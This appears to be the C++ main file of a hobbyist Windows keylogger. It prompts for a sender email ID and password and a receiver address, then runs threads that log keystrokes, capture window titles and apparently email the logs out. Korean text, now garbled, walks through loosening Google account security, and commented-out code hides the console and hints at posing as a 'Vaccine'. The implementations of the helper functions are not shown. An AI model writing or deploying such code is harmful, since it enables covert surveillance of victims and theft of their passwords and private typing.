#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
#include "winmanager.h"
#include "KeyLogger.h"

void console();
void user();
static char senderId[30];// { 0, };
static char senderPw[30];// { 0, };
static char receiverId[30];  // { 0, };
int main()
{
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
    user();
    printf("���� ���̵� >> ");
    scanf_s("%s", senderId, sizeof(senderId));
    printf("���� ��й�ȣ >> ");
    scanf_s("%s", senderPw, sizeof(senderPw));
    printf("�α׸� ������ �̸��� �ּ� >> ");
    scanf_s("%s", receiverId, sizeof(receiverId));

    auto main = []() {
        Keylogger(NULL);
    };
    auto window = []() {
        wintitle();
    };
    auto filesize = []() {
        FSD(senderId, senderPw, receiverId);
    };
    HMODULE hModule = GetModuleHandle(nullptr);
    if (hModule != nullptr) {
        
        printf("�׷�..");
        Sleep(1000);
        printf("�����ҰԿ�..!!\n");
        getchar();
        console();
        thread t1 = thread(main);
        thread t2 = thread(window);
        thread t3 = thread(filesize);
        t1.join();
        t2.join();
        t3.join();
    }
}

void user() {
    printf("======================*****Ű�ΰ�er*****======================\n");
    printf("by KyuBo Shim\n");
    Sleep(2000);
    printf("��� �� ���� ���� ������ �� �������ּ���!!\n");
    printf("���� �α��� --> Google ���� --> ���� --> ���ȼ����� ���� ������ --> ���\n");
    Sleep(1000);
}

void console() {    // testing console
   /* printf("\033[1;32m");
    Sleep(500);
    printf("Vaccine starts in..\n");
    Sleep(1000);*/
    Sleep(800);
    printf("3..\n");
    Sleep(1000);
    printf("2..\n");
    Sleep(1000);
    printf("1..\n");
    Sleep(1000);
    printf("����!!");
    Sleep(500);
    /*HWND hwnd = GetForegroundWindow();
    ShowWindow(hwnd, SW_HIDE);*/
}